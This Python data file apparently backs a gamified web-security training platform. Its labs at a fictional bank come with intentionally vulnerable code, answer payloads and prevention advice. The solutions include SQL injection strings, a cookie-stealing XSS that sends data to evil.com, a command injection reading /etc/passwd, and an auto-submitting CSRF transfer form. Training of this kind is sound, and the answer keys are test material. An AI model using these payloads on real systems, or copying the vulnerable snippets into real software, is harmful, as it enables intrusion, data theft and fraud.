"""
Interactive Attack Labs Data
Each lab provides a realistic penetration testing scenario
"""

ATTACK_LABS = {
    "SQL Injection": [
        {
            "lab_id": "LAB001",
            "title": "Login Bypass using SQL Injection",
            "difficulty": "Easy",
            "category": "SQL Injection",
            "story": "You've been hired to perform a security assessment on CyberShield Bank's admin portal. The login page seems to have weak authentication.",
            "objective": "Login as administrator without knowing the password.",
            "hint": "Think about SQL comments and always-true conditions.",
            "solution": "' OR 1=1 --",
            "vulnerable_code": """# Admin Login - Vulnerable Code
username = request.form.get('username')
password = request.form.get('password')

# Vulnerable: String concatenation in SQL query
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)

if cursor.fetchone():
    return "Welcome Administrator"
else:
    return "Login Failed" """,
            "language": "python",
            "xp_reward": 100,
            "badge_reward": "SQL Injection Beginner",
            "server_responses": {
                "wrong": "Login Failed - Invalid credentials",
                "correct": "Welcome Administrator - Access Granted",
                "partial": "Login Failed - Please try again"
            },
            "explanation": """Your payload modified the SQL query:

Original Query:
SELECT * FROM users WHERE username='admin' AND password=''

Modified Query:
SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --

The OR 1=1 condition always evaluates to TRUE, bypassing authentication.

OWASP Category: A03:2021 – Injection

How to Prevent:
• Use parameterized queries
• Implement prepared statements
• Validate and sanitize all user inputs
• Apply principle of least privilege""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        },
        {
            "lab_id": "LAB002",
            "title": "Data Extraction via UNION Attack",
            "difficulty": "Medium",
            "category": "SQL Injection",
            "story": "The bank's product search page is vulnerable. You need to extract sensitive data from other tables.",
            "objective": "Extract user credentials from the database.",
            "hint": "Use UNION SELECT to combine results. You need to match the number of columns.",
            "solution": "' UNION SELECT username, password FROM users --",
            "vulnerable_code": """# Product Search - Vulnerable Code
search_term = request.args.get('search')

# Vulnerable: Direct string concatenation
query = "SELECT name, price FROM products WHERE name LIKE '%" + search_term + "%'"
cursor.execute(query)
results = cursor.fetchall()""",
            "language": "python",
            "xp_reward": 150,
            "badge_reward": "SQL Injection Intermediate",
            "server_responses": {
                "wrong": "No products found",
                "correct": "Products found: admin / admin123, john / password123...",
                "partial": "Search completed"
            },
            "explanation": """UNION-based SQL injection allows you to extract data from other tables.

Your payload:
' UNION SELECT username, password FROM users --

This combines the original query with data from the users table.

OWASP Category: A03:2021 – Injection

Prevention:
• Use parameterized queries
• Limit database user permissions
• Implement proper error handling""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ],
    "XSS": [
        {
            "lab_id": "LAB003",
            "title": "Reflected XSS in Search",
            "difficulty": "Easy",
            "category": "XSS",
            "story": "The bank's search page reflects user input without proper encoding. Can you inject malicious script?",
            "objective": "Execute an alert() to prove XSS vulnerability.",
            "hint": "Use <script> tags to execute JavaScript.",
            "solution": "<script>alert('XSS')</script>",
            "vulnerable_code": """# Search Page - Vulnerable Code
search_term = request.args.get('q')

# Vulnerable: Direct output without escaping
html = "<h1>Search Results for: " + search_term + "</h1>"
return html""",
            "language": "python",
            "xp_reward": 100,
            "badge_reward": "XSS Hunter",
            "server_responses": {
                "wrong": "No results found",
                "correct": "<h1>Search Results for: <script>alert('XSS')</script></h1> - Alert executed!",
                "partial": "Search results displayed"
            },
            "explanation": """Reflected XSS occurs when user input is reflected in the page without proper encoding.

Your payload: <script>alert('XSS')</script>

This script executes in the victim's browser context.

OWASP Category: A03:2021 – Injection

Prevention:
• Use html.escape() on all user input
• Implement Content Security Policy (CSP)
• Use modern frameworks with auto-escaping""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        },
        {
            "lab_id": "LAB004",
            "title": "Stored XSS in Comments",
            "difficulty": "Medium",
            "category": "XSS",
            "story": "The bank's comment section stores user input without sanitization. Exploit this to steal admin cookies.",
            "objective": "Inject a script that steals cookies.",
            "hint": "Use <img> tag with onerror event.",
            "solution": "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">",
            "vulnerable_code": """# Comment Section - Vulnerable Code
comment = request.form.get('comment')

# Vulnerable: Storing and displaying without sanitization
db.execute("INSERT INTO comments (text) VALUES ('" + comment + "')")
return "Comment posted" """,
            "language": "python",
            "xp_reward": 150,
            "badge_reward": "XSS Expert",
            "server_responses": {
                "wrong": "Comment posted",
                "correct": "Comment posted - Cookie stolen! Admin session compromised.",
                "partial": "Comment posted"
            },
            "explanation": """Stored XSS is more dangerous than reflected XSS because the payload is stored in the database.

Your payload executes every time the comment section loads.

OWASP Category: A03:2021 – Injection

Prevention:
• Sanitize input with DOMPurify
• Use html.escape() on output
• Implement CSP headers
• Use HttpOnly cookies""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ],
    "Command Injection": [
        {
            "lab_id": "LAB005",
            "title": "File Conversion Service",
            "difficulty": "Medium",
            "category": "Command Injection",
            "story": "The bank has a file conversion service that takes a filename and converts it to PDF. The implementation looks vulnerable.",
            "objective": "Execute a command to read the /etc/passwd file.",
            "hint": "Use semicolon to chain commands.",
            "solution": "file.pdf; cat /etc/passwd",
            "vulnerable_code": """# File Converter - Vulnerable Code
filename = request.form.get('filename')

# Vulnerable: os.system with user input
os.system("convert " + filename + " output.pdf")""",
            "language": "python",
            "xp_reward": 150,
            "badge_reward": "Command Injection Expert",
            "server_responses": {
                "wrong": "Conversion failed",
                "correct": "Conversion complete. File contents: root:x:0:0...",
                "partial": "Conversion started"
            },
            "explanation": """Command injection occurs when user input is passed to system commands without validation.

Your payload: file.pdf; cat /etc/passwd

The semicolon chains commands, executing both the convert and cat commands.

OWASP Category: A03:2021 – Injection

Prevention:
• Use subprocess with shell=False
• Pass arguments as a list
• Validate and whitelist inputs
• Never use os.system() with user input""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ],
    "CSRF": [
        {
            "lab_id": "LAB006",
            "title": "CSRF Token Bypass",
            "difficulty": "Medium",
            "category": "CSRF",
            "story": "The bank's transfer function doesn't validate CSRF tokens properly. Create an exploit to transfer funds.",
            "objective": "Create a CSRF exploit to transfer $10000 to attacker account.",
            "hint": "Create an HTML form that auto-submits.",
            "solution": "<form action='/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='10000'></form><script>document.forms[0].submit();</script>",
            "vulnerable_code": """# Transfer - Vulnerable Code
to_account = request.form.get('to')
amount = request.form.get('amount')

# Vulnerable: No CSRF token validation
db.execute("UPDATE accounts SET balance = balance - " + str(amount) + " WHERE account = 'victim'")
db.execute("UPDATE accounts SET balance = balance + " + str(amount) + " WHERE account = '" + to_account + "'")
return "Transfer complete" """,
            "language": "python",
            "xp_reward": 150,
            "badge_reward": "CSRF Hunter",
            "server_responses": {
                "wrong": "Transfer failed",
                "correct": "Transfer complete - $10000 transferred to attacker",
                "partial": "Transfer processing"
            },
            "explanation": """CSRF attacks trick users into performing actions they didn't intend.

Your exploit creates a hidden form that auto-submits to the transfer endpoint.

OWASP Category: A01:2021 – Broken Access Control

Prevention:
• Implement CSRF tokens
• Use SameSite cookies
• Verify Origin/Referer headers
• Require re-authentication for sensitive actions""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ],
    "SSRF": [
        {
            "lab_id": "LAB007",
            "title": "SSRF to Internal Network",
            "difficulty": "Hard",
            "category": "SSRF",
            "story": "The bank's URL fetcher allows accessing internal resources. Exploit this to access the internal admin panel.",
            "objective": "Access the internal admin panel at http://localhost:8080/admin",
            "hint": "Use localhost or 127.0.0.1 to access internal services.",
            "solution": "http://localhost:8080/admin",
            "vulnerable_code": """# URL Fetcher - Vulnerable Code
url = request.form.get('url')

# Vulnerable: No URL validation
response = requests.get(url)
return response.content""",
            "language": "python",
            "xp_reward": 200,
            "badge_reward": "SSRF Expert",
            "server_responses": {
                "wrong": "Failed to fetch URL",
                "correct": "Admin Panel accessed - Internal database credentials exposed!",
                "partial": "Fetching URL..."
            },
            "explanation": """SSRF allows attackers to make requests to internal resources.

Your payload accesses localhost:8080/admin, bypassing network restrictions.

OWASP Category: A10:2021 – Server-Side Request Forgery

Prevention:
• Validate and whitelist URLs
• Block private IP ranges
• Use network segmentation
• Implement allowlists""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ],
    "Insecure Direct Object Reference": [
        {
            "lab_id": "LAB008",
            "title": "IDOR to Access Other Users' Data",
            "difficulty": "Hard",
            "category": "IDOR",
            "story": "The bank's profile page uses sequential user IDs. Access other users' sensitive data by manipulating the ID.",
            "objective": "Access user ID 1001's account details.",
            "hint": "Change the user_id parameter in the URL.",
            "solution": "Change user_id from 1000 to 1001",
            "vulnerable_code": """# Profile Page - Vulnerable Code
user_id = request.args.get('user_id')

# Vulnerable: No authorization check
query = "SELECT * FROM users WHERE id = " + user_id
user_data = db.execute(query).fetchone()
return user_data""",
            "language": "python",
            "xp_reward": 200,
            "badge_reward": "IDOR Master",
            "server_responses": {
                "wrong": "User not found",
                "correct": "User 1001 data: SSN: 123-45-6789, Address: 123 Main St...",
                "partial": "Loading user data..."
            },
            "explanation": """IDOR occurs when applications expose internal object IDs without proper authorization.

By changing user_id from 1000 to 1001, you accessed another user's data.

OWASP Category: A01:2021 – Broken Access Control

Prevention:
• Implement proper authorization checks
• Use indirect references
• Verify user permissions
• Don't expose sequential IDs""",
            "max_attempts_easy": 10,
            "max_attempts_medium": 5,
            "max_attempts_hard": 3
        }
    ]
}


def get_lab_by_id(lab_id: str) -> Optional[Dict[str, Any]]:
    """Get a specific lab by ID"""
    for category, labs in ATTACK_LABS.items():
        for lab in labs:
            if lab["lab_id"] == lab_id:
                return lab
    return None


def get_labs_by_category(category: str) -> List[Dict[str, Any]]:
    """Get all labs for a specific category"""
    return ATTACK_LABS.get(category, [])


def get_all_categories() -> List[str]:
    """Get all available lab categories"""
    return list(ATTACK_LABS.keys())


def get_all_labs() -> List[Dict[str, Any]]:
    """Get all labs"""
    all_labs = []
    for labs in ATTACK_LABS.values():
        all_labs.extend(labs)
    return all_labs


def get_random_lab(category: str = None, difficulty: str = None) -> Optional[Dict[str, Any]]:
    """Get a random lab, optionally filtered by category and/or difficulty"""
    import random
    
    labs = get_all_labs()
    
    if category:
        labs = [lab for lab in labs if lab["category"] == category]
    
    if difficulty:
        labs = [lab for lab in labs if lab["difficulty"] == difficulty]
    
    if not labs:
        return None
    
    return random.choice(labs)